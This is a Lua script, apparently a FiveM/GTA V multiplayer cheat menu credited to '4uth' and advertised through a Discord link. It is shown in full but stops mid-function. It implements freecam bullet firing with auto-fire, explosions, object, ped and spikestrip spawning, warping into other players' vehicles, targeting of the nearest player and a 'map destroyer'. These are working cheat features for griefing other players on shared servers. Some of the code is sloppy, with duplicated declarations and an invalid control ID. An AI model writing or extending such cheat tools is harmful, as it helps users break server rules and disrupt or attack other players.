--    █████████     ██████   ███████████                  
--   ███░░░░░███   ███░░███ ░█░░░███░░░█                  
--  ░███    ░███  ░░██████  ░   ░███  ░                   
--  ░███████████   ██████       ░███                      
--  ░███░░░░░███ ░███░░███      ░███                      
--  ░███    ░███ ░███ ░░███     ░███                      
--  █████   █████░░█████░███    █████                     
-- ░░░░░   ░░░░░  ░░░░░ ░░░    ░░░░░                      
--                                                        
--                                                        
--                                                        
--  ██████   ██████ ██████████ ██████   █████ █████  █████
-- ░░██████ ██████ ░░███░░░░░█░░██████ ░░███ ░░███  ░░███ 
--  ░███░█████░███  ░███  █ ░  ░███░███ ░███  ░███   ░███ 
--  ░███░░███ ░███  ░██████    ░███░░███░███  ░███   ░███ 
--  ░███ ░░░  ░███  ░███░░█    ░███ ░░██████  ░███   ░███ 
--  ░███      ░███  ░███ ░   █ ░███  ░░█████  ░███   ░███ 
--  █████     █████ ██████████ █████  ░░█████ ░░████████  
-- ░░░░░     ░░░░░ ░░░░░░░░░░ ░░░░░    ░░░░░   ░░░░░░░░   


-- discord https://discord.gg/UxKbwDuUYT

local _4uth_credit = "4uth" -- DO NOT REMOVE OR EDIT
if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
print("[INFO][4uth] Freecam script loaded. Credits: Script customized by 4uth.")
local selected_ent = 0
local res_width, res_height = GetActiveScreenResolution()
local cam_active = false
local cam = nil
local DanceWithPedEnabled = false
local dance_ped_global = nil
local crosshairEnabled = false 
local ThermalVision = false
local isEasyHandlingEnabled = false -- מצב Easy Handling (On/Off)
local handlingLevel = 50 -- רמת Easy Handling (ברירת מחדל)
local currHandlingIndex = 50 -- אינדקס נוכחי למחוון
local selHandlingIndex = 50 -- אינדקס נבחר למחוון
local SuperBrakesEnabled = false
local HornBoostEnabled = false
local HornBoostActive = false
local WaterproofEngineEnabled = false
local VehicleJumpEnabled = false
local InvisibleCarEnabled = false
local noRecoilEnabled = false
local menuPosX = 0.0175
local menuPosY = 0.025
local LazerEyeEnabled = false
local AdultEmotesEnabled = false
local destroyMode = "safe" -- יכול להיות "safe" או "quick"
local lockCarFeature = false

-- Keybind System Variables
local keybindMode = false
local keybindTarget = nil
local menuKeybinds = {}
local currentMenuOption = nil

-- Keybind System Variables
local keybindMode = false
local keybindTarget = nil
local menuKeybinds = {}
local currentMenuOption = nil

-- Keys table for keybind system
local Keys = {
    ["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F4"] = 166, ["F5"] = 167, ["F6"] = 168, ["F7"] = 169, ["F8"] = 56, ["F9"] = 57, ["F10"] = 57,
    ["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
    ["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
    ["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
    ["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
    ["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
    ["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
    ["LEFT"] = 174, ["RIGHT"] = 175, ["UP"] = 27, ["DOWN"] = 173,
    ["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
    ["MOUSE1"] = 24, ["MOUSE2"] = 25
}


local features = { "Default", "Teleport", "Shoot", "Delete Entity", "Vehicle Spawner", "Vehicule Hijack", "Object Spawner", "Ped Spawner", "Spikestrip Spawner", "Explode", "Map Destroyer", "Shoot Vehicle","Crosshair" }
-- Helper: Get closest player to crosshair (returns ped and server id if possible)
function GetClosestPlayerToCrosshair(coords, direction)
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    local players = GetActivePlayers()
    local myPed = PlayerPedId()
    local bestPed = nil
    local bestDist = math.huge
    local bestId = nil
    for i = 1, #players do
        local player = players[i]
        local ped = GetPlayerPed(player)
        if ped ~= myPed then
            local pedCoords = GetEntityCoords(ped)
            -- Project ped onto crosshair line
            local toPed = pedCoords - coords
            local proj = (toPed.x * direction.x + toPed.y * direction.y + toPed.z * direction.z)
            local closestPoint = coords + direction * proj
            local dist = #(pedCoords - closestPoint)
            if dist < bestDist then
                bestDist = dist
                bestPed = ped
                bestId = player
            end
        end
    end
    return bestPed, bestId, bestDist
end
-- Helper: Apply Police Outfit
function ApplyPoliceOutfit()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    local playerPed = PlayerPedId()
    ClearPedProp(playerPed, 0)                        -- Clear Hats
    SetPedComponentVariation(playerPed, 1, 0, 0, 2)   -- Masks
    SetPedComponentVariation(playerPed, 3, 4, 0, 2)   -- Arms
    SetPedComponentVariation(playerPed, 4, 2, 0, 2)   -- Pants
    SetPedComponentVariation(playerPed, 5, 0, 0, 2)   -- Bags
    SetPedComponentVariation(playerPed, 6, 25, 0, 2)  -- Shoes
    SetPedComponentVariation(playerPed, 7, 0, 0, 2)   -- Scarfs
    SetPedComponentVariation(playerPed, 8, 15, 0, 2)  -- Undershirts
    SetPedComponentVariation(playerPed, 9, 0, 0, 2)   -- Vests
    SetPedComponentVariation(playerPed, 10, 0, 0, 2)  -- Decals
    SetPedComponentVariation(playerPed, 11, 8, 1, 2)  -- Main Shirts
    SetPedPropIndex(playerPed, 0, 1, 0, true)         -- Hat
    ShowInfo("~g~Police Outfit applied!")
end
-- פונקציה להצגת הודעות
function ShowNotification(message)
    BeginTextCommandThefeedPost('STRING')
    AddTextComponentSubstringPlayerName(message)
    EndTextCommandThefeedPostTicker(true, false)
end
function ApplyHandling(vehicle, level, enable)
    if not DoesEntityExist(vehicle) or not IsVehicleDriveable(vehicle, false) then
        ShowInfo('~r~שגיאה: אתה לא ברכב')
        return
    end

    if enable then
        -- ערכי handling עבור רמה קבועה של 100
        local gravity = 14.8 -- כוח משיכה (9.8 + (100/200)*10.0)
        local suspension = 0.3 -- מתלה (0.5 - (100/200)*0.4)
        local traction = 1.5 -- אחיזה (1.0 + (100/200)*1.0)

        SetVehicleGravityAmount(vehicle, gravity)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fSuspensionForce', suspension)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fTractionCurveMin', traction)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fTractionCurveMax', traction)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fLowSpeedTractionLossMult', 0.1)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fMass', 1250.0) -- 1500.0 - (100/200)*500.0
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fInitialDriveMaxFlatVel', 175.0) -- 150.0 + (100/200)*50.0

        ShowInfo('~g~Easy Handling מופעל')
    else
        -- איפוס ה-handling לברירת מחדל
        SetVehicleGravityAmount(vehicle, 9.8)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fSuspensionForce', 0.5)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fTractionCurveMin', 1.0)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fTractionCurveMax', 1.0)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fLowSpeedTractionLossMult', 1.0)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fMass', 1500.0)
        SetVehicleHandlingFloat(vehicle, 'CHandlingData', 'fInitialDriveMaxFlatVel', 150.0)
        ShowInfo('~y~Easy Handling כבוי')
    end
end
-- Helper: Apply Street Outfit
function ApplyStreetOutfit()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    local playerPed = PlayerPedId()
    ClearPedProp(playerPed, 0)                        -- Clear Hats
    SetPedComponentVariation(playerPed, 1, 0, 0, 2)   -- Masks (none)
    SetPedComponentVariation(playerPed, 3, 4, 0, 2)   -- Arms
    SetPedComponentVariation(playerPed, 4, 14, 0, 2)  -- Pants (jeans)
    SetPedComponentVariation(playerPed, 5, 0, 0, 2)   -- Bags (none)
    SetPedComponentVariation(playerPed, 6, 10, 0, 2)  -- Shoes (sneakers)
    SetPedComponentVariation(playerPed, 7, 0, 0, 2)   -- Scarfs (none)
    SetPedComponentVariation(playerPed, 8, 15, 0, 2)  -- Undershirt
    SetPedComponentVariation(playerPed, 9, 0, 0, 2)   -- Vests (none)
    SetPedComponentVariation(playerPed, 10, 0, 0, 2)  -- Decals (none)
    SetPedComponentVariation(playerPed, 11, 25, 0, 2) -- Main Shirt (casual hoodie)
    SetPedPropIndex(playerPed, 0, 10, 0, true)        -- Hat (backward cap)
    ShowInfo("~g~Street Outfit applied!")
end
 
function StartRCCar()
    local rcCar = nil
    local rcDriver = nil
    local cam = nil
    local player = PlayerPedId()
    local coords = GetEntityCoords(player)

    local carModel = "blista" -- או שתעשה carModel = input (אם יש לך input box בתפריט)

    -- ודא שאין מצלמות פעילות שיתנגשו
    if IsCamRendering() then
        RenderScriptCams(false, true, 500, true, true)
    end

    -- Load models
    RequestModel(GetHashKey(carModel))
    while not HasModelLoaded(GetHashKey(carModel)) do Wait(100) end
    RequestModel(GetHashKey("a_m_m_skater_01"))
    while not HasModelLoaded(GetHashKey("a_m_m_skater_01")) do Wait(100) end

    -- Create vehicle + NPC
    rcCar = CreateVehicle(GetHashKey(carModel), coords.x + 2, coords.y, coords.z, 0.0, true, false)
    rcDriver = CreatePedInsideVehicle(rcCar, 4, GetHashKey("a_m_m_skater_01"), -1, true, false)
    SetEntityInvincible(rcDriver, true)
    SetPedCanRagdoll(rcDriver, false)

    -- Freeze player
    FreezeEntityPosition(player, true)

    -- Create follow cam
    cam = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
    AttachCamToEntity(cam, rcCar, 0.0, -5.0, 2.0, true)
    PointCamAtEntity(cam, rcCar, 0.0, 0.0, 0.0, true)
    SetCamActive(cam, true)
    RenderScriptCams(true, true, 500, true, true)

    -- Main loop
    Citizen.CreateThread(function()
        while true do
            Wait(0)
            if rcCar and rcDriver and DoesEntityExist(rcCar) then
                -- Control RC
                if IsControlPressed(0, 32) then TaskVehicleTempAction(rcDriver, rcCar, 9, 1000) end
                if IsControlPressed(0, 33) then TaskVehicleTempAction(rcDriver, rcCar, 22, 1000) end
                if IsControlPressed(0, 34) then TaskVehicleTempAction(rcDriver, rcCar, 4, 1000) end
                if IsControlPressed(0, 35) then TaskVehicleTempAction(rcDriver, rcCar, 5, 1000) end

                -- Update camera
                local x, y, z = table.unpack(GetEntityCoords(rcCar))
                SetCamCoord(cam, x - 5.0 * math.cos(math.rad(GetEntityHeading(rcCar))),
                                y - 5.0 * math.sin(math.rad(GetEntityHeading(rcCar))),
                                z + 2.0)
                PointCamAtEntity(cam, rcCar, 0.0, 0.0, 0.0, true)

                -- Exit RC mode
                if IsControlJustPressed(0, 177) then
                    if cam then
                        RenderScriptCams(false, true, 500, true, true)
                        DestroyCam(cam, false)
                    end
                    FreezeEntityPosition(player, false)
                    print("Exited RC")
                    break
                end
            else
                break
            end
        end
    end)
end



-- Helper: Add all available attachments to the current weapon
function SetAllWeaponAttachments()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    local playerPed = PlayerPedId()
    local currentWeapon = GetSelectedPedWeapon(playerPed)
    
    if currentWeapon == GetHashKey("weapon_unarmed") then
        ShowInfo("~r~No weapon equipped!")
        return
    end

    -- List of common weapon attachments (extend as needed)
    local attachments = {
        "COMPONENT_AT_PI_SUPP",          -- Suppressor for pistols
        "COMPONENT_AT_AR_SUPP_02",       -- Suppressor for rifles
        "COMPONENT_AT_CLIP_EXTENDED",    -- Extended magazine (generic)
        "COMPONENT_AT_SCOPE_MACRO",      -- Scope for rifles
        "COMPONENT_AT_SCOPE_SMALL",      -- Small scope
        "COMPONENT_AT_PI_FLSH",          -- Flashlight for pistols
        "COMPONENT_AT_AR_FLSH",          -- Flashlight for rifles
        "COMPONENT_AT_AR_AFGRIP",        -- Grip for rifles
        "COMPONENT_AT_RAILCOVER_01",     -- Rail cover
        "COMPONENT_AT_PI_COMP",          -- Compensator for pistols
        "COMPONENT_AT_AR_BARREL_01"      -- Heavy barrel (example)
    }

    -- Apply each attachment if compatible
    for _, component in ipairs(attachments) do
        local componentHash = GetHashKey(component)
        if CanUseWeaponComponent(currentWeapon, componentHash) then
            GiveWeaponComponentToPed(playerPed, currentWeapon, componentHash)
        end
    end

    ShowInfo("~g~All compatible attachments added to weapon!")
end

-- Helper: Check if a weapon can use a specific component
function CanUseWeaponComponent(weaponHash, componentHash)
    return HasPedGotWeaponComponent(PlayerPedId(), weaponHash, componentHash) or
           GetWeaponComponentTypeModel(componentHash) ~= 0
end

-- Helper: Random position on map
function GetRandomPosition()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    local x = math.random(-3000, 3000)
    local y = math.random(-3000, 3000)
    local z = 100.0
    local found, groundZ = GetGroundZFor_3dCoord(x, y, z, 0)
    if found then z = groundZ + 2.0 end
    return vector3(x, y, z)
end
-- Helper: List of funny objects for attach
local funnyObjects = {
    "prop_cone_float_1", "prop_toilet_01", "prop_ld_toilet_01", "prop_beachball_02", "prop_roadcone02a", "prop_barrel_02a", "prop_box_wood02a_pu", "prop_burgerstand_01"
}
-- Helper: List of funny models for change
local funnyModels = {
    "a_c_chimp", "a_c_pig", "a_c_cow", "a_c_deer", "u_m_y_hippie_01", "s_m_m_movalien_01", "a_c_hen"
}
-- Helper: List of sounds for sound spam
local funnySounds = {
    { dict = "DLC_HEIST_HACKING_SNAKE_SOUNDS", name = "Beep_Green" },
    { dict = "DLC_HEIST_HACKING_SNAKE_SOUNDS", name = "Beep_Red" },
    { dict = "DLC_XM_Silo_Sounds", name = "Alarm_Silo" },
    { dict = "DLC_AW_Frontend_Sounds", name = "MP_AW_Splash" }
}
-- Helper: List of NPCs for swarm
local npcModels = {
    "a_m_m_skater_01", "a_m_m_tramp_01", "a_m_y_hippy_01", "a_m_y_musclbeac_01", "a_m_y_roadcyc_01"
}
-- Helper: List of money bag props
local moneyProps = {
    "prop_money_bag_01", "prop_poly_bag_money"
}
-- Helper: Cage prop
local cageProp = "prop_gold_cont_01"
-- Helper: For gravity flip
local gravityFlipped = {}
-- Helper: For shrink/grow
local originalScales = {}
local lastAutoShot = 0
local weapons = {
    { name = "Pistol", hash = "weapon_pistol" },
    { name = "Combat Pistol", hash = "weapon_combatpistol" },
    { name = "AP Pistol", hash = "weapon_appistol", auto = true },
    { name = "Pistol .50", hash = "weapon_pistol50" },
    { name = "SNS Pistol", hash = "weapon_snspistol" },
    { name = "Heavy Pistol", hash = "weapon_heavypistol" },
    { name = "Vintage Pistol", hash = "weapon_vintagepistol" },
    { name = "Marksman Pistol", hash = "weapon_marksmanpistol" },
    { name = "Heavy Revolver", hash = "weapon_revolver" },
    { name = "Stun Gun", hash = "weapon_stungun" },
    { name = "Flare Gun", hash = "weapon_flaregun" },
    { name = "Micro SMG", hash = "weapon_microsmg", auto = true },
    { name = "SMG", hash = "weapon_smg", auto = true },
    { name = "Assault SMG", hash = "weapon_assaultsmg", auto = true },
    { name = "MG", hash = "weapon_mg", auto = true },
    { name = "Combat MG", hash = "weapon_combatmg", auto = true },
    { name = "Pump Shotgun", hash = "weapon_pumpshotgun" },
    { name = "Sawn-Off Shotgun", hash = "weapon_sawnoffshotgun" },
    { name = "Assault Shotgun", hash = "weapon_assaultshotgun", auto = true },
    { name = "Bullpup Shotgun", hash = "weapon_bullpupshotgun" },
    { name = "Carbine Rifle", hash = "weapon_carbinerifle", auto = true },
    { name = "Advanced Rifle", hash = "weapon_advancedrifle", auto = true },
    { name = "Special Carbine", hash = "weapon_specialcarbine", auto = true },
    { name = "Bullpup Rifle", hash = "weapon_bullpuprifle", auto = true },
    { name = "Sniper Rifle", hash = "weapon_sniperrifle" },
    { name = "Heavy Sniper", hash = "weapon_heavysniper" },
    { name = "Grenade Launcher", hash = "weapon_grenadelauncher" },
    { name = "RPG", hash = "weapon_rpg" },
    { name = "Minigun", hash = "weapon_minigun", auto = true },
    { name = "Grenade", hash = "weapon_grenade" },
    { name = "Sticky Bomb", hash = "weapon_stickybomb" },
    { name = "Molotov", hash = "weapon_molotov" }
}
local current_weapon = 1
local current_feature = 1
local teleportMarkerCoords = nil
local mapDestroyerEntity = nil
local spikestrips = {}

-- Map Destroyer: single ramp (Tube)
local mapDestroyerRamps = {
    { name = "Tube", model = "stt_prop_stunt_tube_s" }
}
local currentRampType = 1
local placedRamps = {}

function GetEmptySeat(vehicle)
    local seats = { -1, 0, 1, 2 }
    for _, seat in ipairs(seats) do
        if IsVehicleSeatFree(vehicle, seat) then
            return seat
        end
    end
    return -1
end

function draw_rect_px(x, y, w, h, r, g, b, a)
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    DrawRect((x + w / 2) / res_width, (y + h / 2) / res_height, w / res_width, h / res_height, r, g, b, a)
end

function RotationToDirection(rot)
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    local radiansZ = math.rad(rot.z)
    local radiansX = math.rad(rot.x)
    local cosX = math.cos(radiansX)
    local direction = vector3(-math.sin(radiansZ) * cosX, math.cos(radiansZ) * cosX, math.sin(radiansX))
    return direction
end

function GetClosestPlayerPed()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    local players = GetActivePlayers()
    local myPed = PlayerPedId()
    local myCoords = GetEntityCoords(myPed)
    local closestPed = nil
    local closestDist = math.huge
    for i = 1, #players do
        local player = players[i]
        local ped = GetPlayerPed(player)
        if ped ~= myPed then
            local pedCoords = GetEntityCoords(ped)
            local dist = #(myCoords - pedCoords)
            if dist < closestDist then
                closestDist = dist
                closestPed = ped
            end
        end
    end
    return closestPed
end

function toggle_camera()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    cam_active = not cam_active
    local playerPed = PlayerPedId()
    if cam_active then
        print("[INFO][4uth] Freecam activated from player's POV.")
        -- Start freecam from player's POV for smooth opening
        local pedCoords = GetEntityCoords(playerPed)
        local pedRot = GetEntityRotation(playerPed)
        -- Use ped's camera bone for more accurate eye position if available
        local headBone = GetPedBoneIndex(playerPed, 0x796e) -- SKEL_Head
        local camCoords = pedCoords
        if headBone and headBone ~= -1 then
            camCoords = GetWorldPositionOfEntityBone(playerPed, headBone)
        end
        -- Camera rotation: use gameplay cam if available, else ped's heading
        local gameplay_cam_rot = GetGameplayCamRot()
        local camRot = gameplay_cam_rot
        if not camRot or (camRot.x == 0.0 and camRot.y == 0.0 and camRot.z == 0.0) then
            camRot = vector3(pedRot.x, pedRot.y, GetEntityHeading(playerPed))
        end
        cam = CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA", camCoords.x, camCoords.y, camCoords.z, camRot.x, camRot.y, camRot.z, 70.0)
        SetCamActive(cam, true)
        RenderScriptCams(true, true, 0, false, false)
        FreezeEntityPosition(playerPed, true)
        -- Set initial freecam rotation for smooth mouse look
        _G._freecam_rot = {x = camRot.x, y = camRot.y, z = camRot.z}
    else
        print("[INFO][4uth] Freecam deactivated, returning control to player.")
        SetCamActive(cam, false)
        RenderScriptCams(false, true, 0, false, false)
        DestroyCam(cam)
        cam = nil
        SetFocusEntity(playerPed)
        FreezeEntityPosition(playerPed, false)
    end
end

-- Freecam: keep map loaded around camera
Citizen.CreateThread(function()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    while true do
        if cam_active and cam ~= nil then
            local camCoords = GetCamCoord(cam)
            -- Set focus and load collision at camera position
            SetFocusPosAndVel(camCoords.x, camCoords.y, camCoords.z, 0.0, 0.0, 0.0)
            RequestCollisionAtCoord(camCoords.x, camCoords.y, camCoords.z)
            -- Optionally, load surrounding map (IPL streaming)
            -- RemoveIpl("prologue") -- Example: can be used to force-load IPLs if needed
        else
            ClearFocus()
        end
        Citizen.Wait(0)
    end
end)

Citizen.CreateThread(function()
    if not _4uth_credit or _4uth_credit ~= "4uth" then error("[4uth] Credit missing or tampered. Script disabled.") end
    while true do
        -- Debug: Notify when H is pressed
        if IsControlJustPressed(0, 213123) then -- H key to toggle camera
            print("[MENU][4uth] Freecam toggle pressed")
            toggle_camera()
        end

        if cam_active then
            if IsControlJustPressed(0, 14) then
                if current_feature < #features then
                    current_feature = current_feature + 1
                end
            elseif IsControlJustPressed(0, 15) then
                if current_feature > 1 then
                    current_feature = current_feature - 1
                end
            end

            local coords = GetCamCoord(cam)
            local rot = GetCamRot(cam)
            local direction = RotationToDirection(rot)
            local right_vec = vector3(direction.y, -direction.x, 0.0)

            local ray_start = coords
            local ray_end = coords + direction * 1000.0
            local rayHandle = StartShapeTestRay(ray_start.x, ray_start.y, ray_start.z, ray_end.x, ray_end.y, ray_end.z, -1, PlayerPedId(), 0)
            local _, hit, end_coords, _, entity_hit = GetShapeTestResult(rayHandle)

            local horizontal_move = GetControlNormal(0, 1) * 8 -- revert to previous turn speed
            local vertical_move = GetControlNormal(0, 2) * 8
            local mouse_sensitivity = 2.0 -- revert to previous sensitivity
            local smooth_factor = 0.5 -- revert to previous smoothness
            if not _G._freecam_rot then _G._freecam_rot = {x = rot.x, y = rot.y, z = rot.z} end
            local target_x = _G._freecam_rot.x - vertical_move * mouse_sensitivity
            local target_z = _G._freecam_rot.z - horizontal_move * mouse_sensitivity
            if target_x > 89.0 then target_x = 89.0 end
            if target_x < -89.0 then target_x = -89.0 end
            _G._freecam_rot.x = _G._freecam_rot.x + (target_x - _G._freecam_rot.x) * smooth_factor
            _G._freecam_rot.z = _G._freecam_rot.z + (target_z - _G._freecam_rot.z) * smooth_factor
            SetCamRot(cam, _G._freecam_rot.x, rot.y, _G._freecam_rot.z)

            local shift = IsDisabledControlPressed(0, 21)
            local move_speed = shift and 8.0 or 2.0 -- revert to previous movement speed
            local move_vec = vector3(0.0, 0.0, 0.0)
            local up_vec = vector3(0.0, 0.0, 1.0)
            if IsDisabledControlPressed(0, 32) then move_vec = move_vec + direction end      -- W = forward
            if IsDisabledControlPressed(0, 33) then move_vec = move_vec - direction end      -- S = backward
            if IsDisabledControlPressed(0, 34) then move_vec = move_vec - right_vec end      -- A = left
            if IsDisabledControlPressed(0, 35) then move_vec = move_vec + right_vec end      -- D = right
            if IsDisabledControlPressed(0, 20) then move_vec = move_vec + up_vec end         -- Z = up
            if IsDisabledControlPressed(0, 36) then move_vec = move_vec - up_vec end         -- Left Ctrl = down
            if #(move_vec) > 0.0 then
                move_vec = move_vec / #(move_vec) * move_speed
                SetCamCoord(cam, coords.x + move_vec.x, coords.y + move_vec.y, coords.z + move_vec.z)
            end

            local centerX = 0.5 -- Center of screen
            -- Move menu just below the crosshair (center of screen, slightly down)
            local centerY = 0.58 -- Just below crosshair (crosshair is ~0.5-0.6)
            local lineHeight = 0.025 -- Compact list
            for idx = 1, #features do
                SetTextFont(0)
                SetTextProportional(1)
                SetTextScale(0.0, 0.22)
                if idx == current_feature then
                    SetTextColour(255, 255, 255, 255)
                else
                    SetTextColour(200, 200, 200, 180)
                end
                SetTextCentre(1)
                SetTextOutline()
                SetTextEntry("STRING")
                AddTextComponentString(features[idx])
                DrawText(centerX, centerY + (idx - 1) * lineHeight)
            end

            -- === FEATURES ===
            -- ...existing code...




            if features[current_feature] == "Shoot" then
            print("[MENU][4uth] Shoot")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 0, 0, 255)
                local weaponHash = GetHashKey("weapon_appistol")
                RequestWeaponAsset(weaponHash, 31, 0)
                local function shoot_bullet()
                    local x, y, z = table.unpack(coords + direction * 5.0)
                    ShootSingleBulletBetweenCoords(coords.x, coords.y, coords.z, x, y, z, 100, true, weaponHash, -1, true, false, -1.0)
                end
                if IsDisabledControlPressed(0, 24) then
                    local now = GetGameTimer()
                    if now - lastAutoShot > 60 then
                        if HasWeaponAssetLoaded(weaponHash) then
                            shoot_bullet()
                            lastAutoShot = now
                        end
                    end
                else
                    if IsDisabledControlJustPressed(0, 24) then
                        if HasWeaponAssetLoaded(weaponHash) then
                            shoot_bullet()
                        end
                    end
                end
            elseif features[current_feature] == "Object Spawner" then
            print("[MENU][4uth] Object Spawner")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 255, 255, 255)
                if not _G._objSpawnerList then
                    -- Only use the requested model as the default
                    _G._objSpawnerList = {"prop_shuttering03"}
                    _G._objSpawnerIndex = 1
                end
                if not _G._objSpawnerModel or not IsModelInCdimage(GetHashKey(_G._objSpawnerModel)) then
                    _G._objSpawnerModel = _G._objSpawnerList[_G._objSpawnerIndex]
                end
                -- Q key input for object spawner removed as requested
                -- (R bind removed)
                if IsDisabledControlJustPressed(0, 24) then
                    local objectModel = GetHashKey(_G._objSpawnerModel)
                    RequestModel(objectModel)
                    local timeout = GetGameTimer() + 5000
                    while not HasModelLoaded(objectModel) and GetGameTimer() < timeout do Wait(0) end
                    if HasModelLoaded(objectModel) then
                        if hit == 1 then
                            local obj = CreateObject(objectModel, end_coords.x, end_coords.y, end_coords.z, true, false, true)
                            SetEntityAsMissionEntity(obj, true, true)
                            SetModelAsNoLongerNeeded(objectModel)
                        else
                            local spawnCoords = coords + direction * 10.0
                            local obj = CreateObject(objectModel, spawnCoords.x, spawnCoords.y, spawnCoords.z, true, false, true)
                            SetEntityAsMissionEntity(obj, true, true)
                            SetModelAsNoLongerNeeded(objectModel)
                        end
                    end
                end
            elseif features[current_feature] == "Ped Spawner" then
            print("[MENU][4uth] Ped Spawner")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 0, 255, 0, 255)
                if not _G._pedSpawnerModel then _G._pedSpawnerModel = "a_m_m_skidrow_01" end
                -- Q key input for ped spawner removed as requested
                if IsDisabledControlJustPressed(0, 24) then
                    local pedModel = GetHashKey(_G._pedSpawnerModel)
                    RequestModel(pedModel)
                    local timeout = GetGameTimer() + 5000
                    while not HasModelLoaded(pedModel) and GetGameTimer() < timeout do Wait(0) end
                    if HasModelLoaded(pedModel) then
                        if hit == 1 then
                            local ped = CreatePed(26, pedModel, end_coords.x, end_coords.y, end_coords.z, 0.0, true, false)
                            SetEntityAsMissionEntity(ped, true, true)
                            SetModelAsNoLongerNeeded(pedModel)
                        else
                            local spawnCoords = coords + direction * 10.0
                            local ped = CreatePed(26, pedModel, spawnCoords.x, spawnCoords.y, spawnCoords.z, 0.0, true, false)
                            SetEntityAsMissionEntity(ped, true, true)
                            SetModelAsNoLongerNeeded(pedModel)
                        end
                    end
                end
            elseif features[current_feature] == "Spikestrip Spawner" then
            print("[MENU][4uth] Spikestrip")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 255, 0, 255)
                if IsDisabledControlJustPressed(0, 24) then
                    local spikestripModel = GetHashKey("p_ld_stinger_s")
                    RequestModel(spikestripModel)
                    while not HasModelLoaded(spikestripModel) do Wait(0) end
                    local obj
                    if hit == 1 then
                        obj = CreateObject(spikestripModel, end_coords.x, end_coords.y, end_coords.z, true, false, true)
                    else
                        local spawnCoords = coords + direction * 10.0
                        obj = CreateObject(spikestripModel, spawnCoords.x, spawnCoords.y, spawnCoords.z, true, false, true)
                    end
                    SetEntityAsMissionEntity(obj, true, true)
                    SetModelAsNoLongerNeeded(spikestripModel)
                    table.insert(spikestrips, obj)
                end
            elseif features[current_feature] == "Explode" then
            print("[MENU][4uth] Explode")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 255, 128, 0, 255)
                if IsDisabledControlJustPressed(0, 24) then
                    local fireCoords
                    if hit == 1 then
                        fireCoords = end_coords
                    else
                        fireCoords = coords + direction * 10.0
                    end
                    AddExplosion(fireCoords.x, fireCoords.y, fireCoords.z, 6, 10.0, true, false, 1.0)
                end
            elseif features[current_feature] == "Teleport" then
            print("[MENU][4uth] Teleport")
                draw_rect_px(res_width / 2 - 1, res_height / 2 - 1, 2, 2, 0, 255, 0, 255)
                if hit then
                    teleportMarkerCoords = end_coords
                end
                if teleportMarkerCoords ~= nil and IsDisabledControlJustPressed(0, 24) then
                    local playerPed = PlayerPedId()
                    if entity_hit ~= 0 and IsEntityAVehicle(entity_hit) then
                        local vehicle = entity_hit
                        local seat = GetEmptySeat(vehicle)
                        if seat == -1 then
                            TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                        elseif seat >= 0 then
                            TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                        end
                    else
                        if IsPedInAnyVehicle(playerPed, false) then
                            local veh = GetVehiclePedIsIn(playerPed, false)
                            SetEntityCoords(veh, teleportMarkerCoords.x, teleportMarkerCoords.y, teleportMarkerCoords.z, false, false, false, false)
                        else
